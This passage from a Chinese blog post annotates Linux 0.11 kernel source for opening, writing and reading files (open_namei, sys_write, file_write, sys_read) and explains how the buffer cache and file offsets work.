class="line">check_disk_change(inode-&gt;i_zone[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">/* 初始化内存文件结构的各个参数 */</span></span><br><span class="line">f-&gt;f_mode = inode-&gt;i_mode;</span><br><span class="line">f-&gt;f_flags = flag;</span><br><span class="line">f-&gt;f_count = <span class="number">1</span>;</span><br><span class="line">f-&gt;f_inode = inode;</span><br><span class="line">f-&gt;f_pos = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> (fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在整个打开文件的过程中，除了真正去文件系统查找文件的时候用到了文件名，其它时候，都将是以文件描述符进行交互的。</p><p>再看看更细节的方面，毕竟就目前来说，我们跳过了最重要的一环 <code>open_namei</code> ，从而看似整个流程都简单了很多很多。</p><p>通常我们在编码过程中都是通过绝对地址/相对地址来唯一定位一个文件。因此，就必然存在逐级寻找文件的过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct m_inode * <span class="title">get_dir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * pathname)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * thisname;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">inode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line"><span class="keyword">int</span> namelen,inr,idev;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dir_entry</span> * <span class="title">de</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 判定当前任务设定的根节点是否有效 */</span></span><br><span class="line"><span class="keyword">if</span> (!current-&gt;root || !current-&gt;root-&gt;i_count)</span><br><span class="line">panic(<span class="string">"No root inode"</span>);</span><br><span class="line">    <span class="comment">/* 判定当前路径i节点是否有效 */</span></span><br><span class="line"><span class="keyword">if</span> (!current-&gt;pwd || !current-&gt;pwd-&gt;i_count)</span><br><span class="line">panic(<span class="string">"No cwd inode"</span>);</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 这里的 get_fs_byte(..) 是宏定义，fs 指的是 FS 段寄存器</span></span><br><span class="line"><span class="comment">     * Linux 内核将 DS, ES 用于内核数据段, 用 FS 指向局部描述符表的当前任务数据段</span></span><br><span class="line"><span class="comment">     * 这里可以简单理解成取字符数组的第一个字节</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">if</span> ((c=get_fs_byte(pathname))==<span class="string">'/'</span>) &#123;</span><br><span class="line">inode = current-&gt;root;</span><br><span class="line">pathname++;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c)</span><br><span class="line">inode = current-&gt;pwd;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;<span class="comment">/* empty name is bad */</span></span><br><span class="line">inode-&gt;i_count++;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">thisname = pathname;</span><br><span class="line"><span class="keyword">if</span> (!S_ISDIR(inode-&gt;i_mode) || !permission(inode,MAY_EXEC)) &#123;</span><br><span class="line">iput(inode);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(namelen=<span class="number">0</span>;(c=get_fs_byte(pathname++))&amp;&amp;(c!=<span class="string">'/'</span>);namelen++)</span><br><span class="line"><span class="comment">/* nothing */</span> ;</span><br><span class="line"><span class="keyword">if</span> (!c)</span><br><span class="line"><span class="keyword">return</span> inode;</span><br><span class="line"><span class="keyword">if</span> (!(bh = find_entry(&amp;inode,thisname,namelen,&amp;de))) &#123;</span><br><span class="line">iput(inode);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">inr = de-&gt;inode;</span><br><span class="line">idev = inode-&gt;i_dev;</span><br><span class="line">brelse(bh);</span><br><span class="line">iput(inode);</span><br><span class="line"><span class="keyword">if</span> (!(inode = iget(idev,inr)))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *dir_namei()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 处理路径 pathname, 处理成i节点表示的最终一级目录+目录下文件名(也可能pathname表示的就是目录)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct m_inode * <span class="title">dir_namei</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * pathname, <span class="keyword">int</span> * namelen, <span class="keyword">const</span> <span class="keyword">char</span> ** name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * basename;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">dir</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(dir = get_dir(pathname)))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">basename = pathname;</span><br><span class="line"><span class="keyword">while</span> (c=get_fs_byte(pathname++))</span><br><span class="line"><span class="keyword">if</span> (c==<span class="string">'/'</span>)</span><br><span class="line">basename=pathname;</span><br><span class="line">*namelen = pathname-basename<span class="number">-1</span>;</span><br><span class="line">*name = basename;</span><br><span class="line"><span class="keyword">return</span> dir;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *open_namei()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * namei for open - this is in fact almost the whole open-routine.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open_namei</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * pathname, <span class="keyword">int</span> flag, <span class="keyword">int</span> mode,</span></span></span><br><span class="line"><span class="function"><span class="params">struct m_inode ** res_inode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * basename;</span><br><span class="line"><span class="keyword">int</span> inr,dev,namelen;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">dir</span>, *<span class="title">inode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dir_entry</span> * <span class="title">de</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((flag &amp; O_TRUNC) &amp;&amp; !(flag &amp; O_ACCMODE))</span><br><span class="line">flag |= O_WRONLY;</span><br><span class="line">mode &amp;= <span class="number">0777</span> &amp; ~current-&gt;umask;</span><br><span class="line">mode |= I_REGULAR;</span><br><span class="line"><span class="keyword">if</span> (!(dir = dir_namei(pathname,&amp;namelen,&amp;basename)))</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line">    <span class="comment">/* 如果给的 pathname 是一个目录 */</span></span><br><span class="line"><span class="keyword">if</span> (!namelen) &#123;<span class="comment">/* special case: '/usr/' etc */</span></span><br><span class="line"><span class="keyword">if</span> (!(flag &amp; (O_ACCMODE|O_CREAT|O_TRUNC))) &#123;</span><br><span class="line">*res_inode=dir;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">iput(dir);</span><br><span class="line"><span class="keyword">return</span> -EISDIR;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/* 找到目录对应的i节点的数据块 */</span></span><br><span class="line">bh = find_entry(&amp;dir,basename,namelen,&amp;de);</span><br><span class="line"><span class="keyword">if</span> (!bh) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flag &amp; O_CREAT)) &#123;</span><br><span class="line">iput(dir);</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!permission(dir,MAY_WRITE)) &#123;</span><br><span class="line">iput(dir);</span><br><span class="line"><span class="keyword">return</span> -EACCES;</span><br><span class="line">&#125;</span><br><span class="line">inode = new_inode(dir-&gt;i_dev);</span><br><span class="line"><span class="keyword">if</span> (!inode) &#123;</span><br><span class="line">iput(dir);</span><br><span class="line"><span class="keyword">return</span> -ENOSPC;</span><br><span class="line">&#125;</span><br><span class="line">inode-&gt;i_uid = current-&gt;euid;</span><br><span class="line">inode-&gt;i_mode = mode;</span><br><span class="line">inode-&gt;i_dirt = <span class="number">1</span>;</span><br><span class="line">bh = add_entry(dir,basename,namelen,&amp;de);</span><br><span class="line"><span class="keyword">if</span> (!bh) &#123;</span><br><span class="line">inode-&gt;i_nlinks--;</span><br><span class="line">iput(inode);</span><br><span class="line">iput(dir);</span><br><span class="line"><span class="keyword">return</span> -ENOSPC;</span><br><span class="line">&#125;</span><br><span class="line">de-&gt;inode = inode-&gt;i_num;</span><br><span class="line">bh-&gt;b_dirt = <span class="number">1</span>;</span><br><span class="line">brelse(bh);</span><br><span class="line">iput(dir);</span><br><span class="line">*res_inode = inode;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">inr = de-&gt;inode;</span><br><span class="line">dev = dir-&gt;i_dev;</span><br><span class="line">brelse(bh);</span><br><span class="line">iput(dir);</span><br><span class="line"><span class="keyword">if</span> (flag &amp; O_EXCL)</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line"><span class="keyword">if</span> (!(inode=iget(dev,inr)))</span><br><span class="line"><span class="keyword">return</span> -EACCES;</span><br><span class="line"><span class="keyword">if</span> ((S_ISDIR(inode-&gt;i_mode) &amp;&amp; (flag &amp; O_ACCMODE)) ||</span><br><span class="line">    !permission(inode,ACC_MODE(flag))) &#123;</span><br><span class="line">iput(inode);</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line">&#125;</span><br><span class="line">inode-&gt;i_atime = CURRENT_TIME;</span><br><span class="line"><span class="keyword">if</span> (flag &amp; O_TRUNC)</span><br><span class="line">truncate(inode);</span><br><span class="line">*res_inode = inode;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><p>接下来就要进行文件写入的流程了</p><p>如何陷入内核态函数就不再细说了，相信看过这么多系统调用之后，也能知道基本上系统调用在内核态对应的函数都是以 sys_<method> 形式出现的</method></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_write</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd,<span class="keyword">char</span> * buf,<span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">inode</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 非法 fd , 抛异常 */</span></span><br><span class="line"><span class="keyword">if</span> (fd&gt;=NR_OPEN || count &lt;<span class="number">0</span> || !(file=current-&gt;filp[fd]))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">/* count = 0，无需写入数据 */</span></span><br><span class="line"><span class="keyword">if</span> (!count)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">inode=file-&gt;f_inode;</span><br><span class="line">    <span class="comment">/* 针对不同的i节点类型，有不同的写入函数 */</span></span><br><span class="line"><span class="keyword">if</span> (inode-&gt;i_pipe)</span><br><span class="line"><span class="keyword">return</span> (file-&gt;f_mode&amp;<span class="number">2</span>)?write_pipe(inode,buf,count):-EIO;</span><br><span class="line"><span class="keyword">if</span> (S_ISCHR(inode-&gt;i_mode))</span><br><span class="line"><span class="keyword">return</span> rw_char(WRITE,inode-&gt;i_zone[<span class="number">0</span>],buf,count,&amp;file-&gt;f_pos);</span><br><span class="line"><span class="keyword">if</span> (S_ISBLK(inode-&gt;i_mode))</span><br><span class="line"><span class="keyword">return</span> block_write(inode-&gt;i_zone[<span class="number">0</span>],&amp;file-&gt;f_pos,buf,count);</span><br><span class="line"><span class="keyword">if</span> (S_ISREG(inode-&gt;i_mode))</span><br><span class="line"><span class="keyword">return</span> file_write(inode,file,buf,count);</span><br><span class="line">printk(<span class="string">"(Write)inode-&gt;i_mode=%06o\n\r"</span>,inode-&gt;i_mode);</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看看对于常规文件是怎么操作的吧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_write</span><span class="params">(struct m_inode * inode, struct file * filp, <span class="keyword">char</span> * buf, <span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">off_t</span> pos;      <span class="comment">/* 偏移量 */</span></span><br><span class="line"><span class="keyword">int</span> block,c;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line"><span class="keyword">char</span> * p;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果是 Append 模式，把偏移量重置到文件末尾 */</span></span><br><span class="line"><span class="keyword">if</span> (filp-&gt;f_flags &amp; O_APPEND) </span><br><span class="line">pos = inode-&gt;i_size;</span><br><span class="line">    <span class="comment">/* 否则就使用当前文件数据结构持有的偏移量 */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        附上数据结构  file 的内容 </span></span><br><span class="line"><span class="comment">        struct file &#123;</span></span><br><span class="line"><span class="comment">        unsigned short f_mode;</span></span><br><span class="line"><span class="comment">        unsigned short f_flags;</span></span><br><span class="line"><span class="comment">        unsigned short f_count;</span></span><br><span class="line"><span class="comment">        struct m_inode * f_inode;</span></span><br><span class="line"><span class="comment">        off_t f_pos;    每个打开的文件都将持有当前的偏移值</span></span><br><span class="line"><span class="comment">        &#125;;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">pos = filp-&gt;f_pos;</span><br><span class="line">    <span class="comment">/* 逐字符向缓冲区写入数据 */</span></span><br><span class="line"><span class="keyword">while</span> (i&lt;count) &#123;</span><br><span class="line">        <span class="comment">/* 最开始当然是创建在磁盘上占用一个数据块了 (如果文件对应的块不存在的话) */</span></span><br><span class="line"><span class="keyword">if</span> (!(block = create_block(inode,pos/BLOCK_SIZE)))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">/* 根据数据块获得相应的缓冲块 */</span></span><br><span class="line"><span class="keyword">if</span> (!(bh=bread(inode-&gt;i_dev,block)))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">/* 在缓冲块中的偏移量 */</span></span><br><span class="line">c = pos % BLOCK_SIZE;</span><br><span class="line">        <span class="comment">/* 定位到具体的缓冲区的内存地址 */</span></span><br><span class="line">p = c + bh-&gt;b_data;</span><br><span class="line">bh-&gt;b_dirt = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">/* 当前这个缓冲块还有多少字节可写 */</span></span><br><span class="line">c = BLOCK_SIZE-c;</span><br><span class="line">        <span class="comment">/* 如果需要写入的数据量少于 c */</span></span><br><span class="line"><span class="keyword">if</span> (c &gt; count-i) c = count-i;</span><br><span class="line">        <span class="comment">/* 添加偏移量计数, 更新数据结构中维护的值 */</span></span><br><span class="line">pos += c;</span><br><span class="line"><span class="keyword">if</span> (pos &gt; inode-&gt;i_size) &#123;</span><br><span class="line">inode-&gt;i_size = pos;</span><br><span class="line">inode-&gt;i_dirt = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">i += c;</span><br><span class="line">        <span class="comment">/* 向缓冲块逐字节写入数据 */</span></span><br><span class="line"><span class="keyword">while</span> (c--&gt;<span class="number">0</span>)</span><br><span class="line">*(p++) = get_fs_byte(buf++);</span><br><span class="line">        <span class="comment">/* 释放对缓冲块的占用，当然，在释放前会完成缓冲块&lt;-&gt;外存数据块的同步 */</span></span><br><span class="line">brelse(bh);</span><br><span class="line">&#125;</span><br><span class="line">inode-&gt;i_mtime = CURRENT_TIME;</span><br><span class="line"><span class="keyword">if</span> (!(filp-&gt;f_flags &amp; O_APPEND)) &#123;</span><br><span class="line">        <span class="comment">/* 非 APPEND 模式，更新文件读写指针(偏移量); APPEND 模式是使用 inode-&gt;i_size ，所有就不需要在这里更新了 */</span></span><br><span class="line">filp-&gt;f_pos = pos;</span><br><span class="line">inode-&gt;i_ctime = CURRENT_TIME;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (i?i:<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是不是觉得也没有什么太高大上的操作。确实如此，更多关于缓存块与文件系统数据块的同步都已经被包装到 bread(), brelse() 中了。</p><p>不过，暂时无需细究。总之到此为止，先要有一个基础的观念: 所有与外存储器(这里也包括控制台等)进行数据交互都必须经过缓冲区</p><p>缓冲区封装了对外存储器的全部操作，而提供给 CPU 更高效的 I/O 操作，当然，也更为简单快捷</p><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>至于文件读取，也基本类似了，所以也就不再深入描述。</p><p>当然，要注意的就是，在本篇开始的部分提供的例程中，write &amp; read 中插入了 <code>off_t off = lseek(fd, 0, SEEK_SET);</code>  这样的代码。</p><p>原因应该也能够想到，学习 <code>sys_write(..)</code> 的时候我们已经看到，任务对同一个文件在内存中维护了一个文件读写偏移量。因此，要读取刚才写入的内容，就不得不先改动这个读写偏移量了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_read</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd,<span class="keyword">char</span> * buf,<span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">inode</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fd&gt;=NR_OPEN || count&lt;<span class="number">0</span> || !(file=current-&gt;filp[fd]))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (!count)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">verify_area(buf,count);</span><br><span class="line">inode = file-&gt;f_inode;</span><br><span class="line"><span class="keyword">if</span> (inode-&gt;i_pipe)</span><br><span class="line"><span class="keyword">return</span> (file-&gt;f_mode&amp;<span class="number">1</span>)?read_pipe(inode,buf,count):-EIO;</span><br><span class="line"><span class="keyword">if</span> (S_ISCHR(inode-&gt;i_mode))</span><br><span class="line"><span class="keyword">return</span> rw_char(READ,inode-&gt;i_zone[<span class="number">0</span>],buf,count,&amp;file-&gt;f_pos);</span><br><span class="line"><span class="keyword">if</span> (S_ISBLK(inode-&gt;i_mode))</span><br><span class="line"><span class="keyword">return</span> block_read(inode-&gt;i_zone[<span class="number">0</span>],&amp;file-&gt;f_pos,buf,count);</span><br><span class="line"><span class="keyword">if</span> (S_ISDIR(inode-&gt;i_mode) || S_ISREG(inode-&gt;i_mode)) &#123;</span><br><span class="line"><span class="keyword">if</span> (count+file-&gt;f_pos &gt; inode-&gt;i_size)</span><br><span class="line">count = inode-&gt;i_size - file-&gt;f_pos;</span><br><span class="line"><span class="keyword">if</span> (count&lt;=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> file_read(inode,file,buf,count);</span><br><span class="line">&#125;</span><br><span class="line">printk(<span class="string">"(Read)inode-&gt;i_mode=%06o\n\r"</span>,inode-&gt;i_mode);</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这篇对文件系统的代码层面的描述，仅仅只是捡了一个相当有限的片面 (常规文件读写)。从文件系统的挂载开始提供了一个读写的完整流程介绍(当然，很多细节是缺失的，不过不要着急)。</p><p>虽然平常都能够了解到一个比较模糊的前提，文件读写需要利用缓冲区，但是究竟什么是缓存区，如何使用都不会有太多的概念。本篇最大的重点，就是首先请读者们建立起一个基础性的对缓冲区的了解。事实上，这个中介在 I/O 中扮演了相当重要的角色。而且内存也为其提供了相当大的一份空间，差不多有 1/4 了。</p><p>跨了差不多半个多月来写，上下文的承接可能有些生硬了，甚至不一致了… 尴尬…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://dormouse-none.github.io/2018-10-14-understand-Kernel-5/&quot;&gt;前一篇&lt;/a&gt;已经描述对文件系统进行了宏观性的描述，这一篇，将以特定的文件读写操作为示例，串联对整个文件系统的基本操作。&lt;/p&gt;
&lt;p&gt;首先先来看看平台相关的文件读写操作的 C 代码是怎样一个调用方式&lt;/p&gt;
